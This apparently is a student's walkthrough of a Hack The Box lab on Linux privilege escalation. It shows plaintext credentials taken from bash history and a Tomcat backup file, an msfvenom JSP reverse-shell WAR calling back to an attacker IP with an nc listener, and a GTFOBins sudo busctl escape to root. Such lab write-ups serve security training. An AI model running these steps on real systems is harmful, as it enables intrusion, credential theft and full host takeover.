htb-student@nix03:~$ sudo --version
Sudo version **1.8.31**
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31


htb-student@nix03:~$ cat /etc/os-release
NAME="Ubuntu"
VERSION="**20.04.1** LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.1 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

htb-student@nix03:~$ uname -a
**Linux nix03 5.4.0-45**-generic #49-Ubuntu SMP Wed Aug 26 13:38:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux


htb-student@nix03:~$ cat /home//.bash_history 2>/dev/null
cd /home/barry
ls
id
ssh-keygen
mysql -u root -p
tmux new -s barry
cd ~
sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
history -d 6
history
history -d 12
history
cd /home/bash
cd /home/barry/
nano .bash_history 
history
exit
history
exit
ls -la
ls -l
history 
history -d 21
history 
exit
id
ls /var/log
history
history -d 28
history
exit
id
ls
ls /var/www/html
cat /var/www/html/flag1.txt 
exit

login as barry **su barry**

barry@nix03:/var/log$ netstat -tulnp
(No info could be read for "-p": geteuid()=1001 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::33060                :::*                    LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -              

**Found non-standard port 8080 running, checking it out**

barry@nix03:/var/log$ ps aux | grep 8080
barry       6495  0.0  0.0   6300   668 pts/0    S+   17:05   0:00 grep --color=auto 8080

**Discovered it is tomcat**

barry@nix03:/var/log$ curl -v http://127.0.0.1:8080
*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 
< Accept-Ranges: bytes
< ETag: W/"1895-1599107242297"
< Last-Modified: Thu, 03 Sep 2020 04:27:22 GMT
< Content-Type: text/html
< Content-Length: 1895
< Date: Fri, 26 Dec 2025 17:05:43 GMT
< 
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
    <title>Apache Tomcat</title>
</head>

<body>
<h1>It works !</h1>

<p>If you're seeing this page via a web browser, it means you've setup Tomcat successfully. Congratulations!</p>
 
<p>This is the default Tomcat home page. It can be found on the local filesystem at: <code>/var/lib/tomcat9/webapps/ROOT/index.html</code></p>

<p>Tomcat veterans might be pleased to learn that this system instance of Tomcat is installed with <code>CATALINA_HOME</code> in <code>/usr/share/tomcat9</code> and <code>CATALINA_BASE</code> in <code>/var/lib/tomcat9</code>, following the rules from <code>/usr/share/doc/tomcat9-common/RUNNING.txt.gz</code>.</p>

<p>You might consider installing the following packages, if you haven't already done so:</p>

<p><b>tomcat9-docs</b>: This package installs a web application that allows to browse the Tomcat 9 documentation locally. Once installed, you can access it by clicking <a href="docs/">here</a>.</p>

<p><b>tomcat9-examples</b>: This package installs a web application that allows to access the Tomcat 9 Servlet and JSP examples. Once installed, you can access it by clicking <a href="examples/">here</a>.</p>

<p><b>tomcat9-admin</b>: This package installs two web applications that can help managing this Tomcat instance. Once installed, you can access the <a href="manager/html">manager webapp</a> and the <a href="host-manager/html">host-manager webapp</a>.</p>

<p>NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui". Users are defined in <code>/etc/tomcat9/tomcat-users.xml</code>.</p>

</body>
</html>
* Connection #0 to host 127.0.0.1 left intact
barry@nix03:/var/log$ 
barry@nix03:/var/log$ 
barry@nix03:/var/log$ cat /etc/tomcat9/tomcat-users.xml
cat: /etc/tomcat9/tomcat-users.xml: Permission denied

**Checking tomcat directory**

barry@nix03:/var/log$ ls -la /etc/tomcat9
total 224
drwxr-xr-x  4 root root     4096 Sep  5  2020 .
drwxr-xr-x 97 root root     4096 Jun 11  2025 ..
drwxrwxr-x  3 root tomcat   4096 Sep  3  2020 Catalina
-rw-r-----  1 root tomcat   7262 Feb  5  2020 catalina.properties
-rw-r-----  1 root tomcat   1400 Feb  5  2020 context.xml
-rw-r-----  1 root tomcat   1149 Feb  5  2020 jaspic-providers.xml
-rw-r-----  1 root tomcat   2799 Feb 24  2020 logging.properties
drwxr-xr-x  2 root tomcat   4096 Sep  3  2020 policy.d
-rw-r-----  1 root tomcat   7586 Feb 24  2020 server.xml
-rw-r-----  1 root tomcat   2232 Sep  5  2020 tomcat-users.xml
-rwxr-xr-x  1 root barry    2232 Sep  5  2020 tomcat-users.xml.bak
-rw-r-----  1 root tomcat 172362 Feb  5  2020 web.xml

**Found readable users backup file which contains creds**

barry@nix03:/var/log$ cat /etc/tomcat9/tomcat-users.xml.bak

**SNIP**

<user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script">

Navigated to http://10.129.235.16:8080/
Created reverse shell -- 
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.75 LPORT=4443 -f war > backup_v2.war
nc -lvnp 4443
Deployed backup .WAR
Popped rev shell on tomcat
python3 -c 'import pty;pty.spawn("/bin/bash")' 
sudo busctl --show-machine
This command displays information about system processes running, showing that the user can access the system bus.


tomcat@nix03:/var/lib/tomcat9$ sudo busctl --show-machine sudo busctl --show-machine WARNING: terminal is not fully functional - (press RETURN) NAME PID PROCESS USER CONNECTION > :1.1 568 systemd-timesyn systemd-timesync :1.1 > :1.10 689 snapd root :1.10 > :1.15 1273 systemd htb-student :1.15 > :1.18 2383 fwupd root :1.18 > :1.2 1 systemd root :1.2 > :1.25 7774 busctl root :1.25 > :1.4 666 accounts-daemon root :1.4 > :1.5 690 systemd-logind root :1.5 > :1.6 748 polkitd root :1.6 > :1.7 681 networkd-dispat root :1.7 > :1.8 830 systemd-resolve systemd-resolve :1.8 > :1.9 882 unattended-upgr root :1.9 > com.ubuntu.LanguageSelector - - - (activatabl> com.ubuntu.SoftwareProperties - - - (activatabl> org.freedesktop.Accounts 666 accounts-daemon root :1.4 > org.freedesktop.DBus 1 systemd root - > org.freedesktop.PackageKit - - - (activatabl> org.freedesktop.PolicyKit1 748 polkitd root :1.6 > org.freedesktop.bolt - - - (activatabl> org.freedesktop.fwupd 2383 fwupd root :1.18 > org.freedesktop.hostname1 - - - (activatabl> org.freedesktop.locale1 - - - (activatabl> lines 1-23 org.freedesktop.login1 690 systemd-logind root :1.5 > lines 2-24 org.freedesktop.network1 - - - (activatabl> lines 3-25 org.freedesktop.resolve1 830 systemd-resolve systemd-resolve :1.8 > lines 4-26 org.freedesktop.systemd1 1 systemd root :1.2 > lines 5-27 org.freedesktop.thermald - - - (activatabl> lines 6-28 org.freedesktop.timedate1 - - - (activatabl> lines 7-29 org.freedesktop.timesync1 568 systemd-timesyn systemd-timesync :1.1 > lines 8-30

!/bin/bash - drops you into root shell

source: https://gtfobins.github.io/gtfobins/busctl/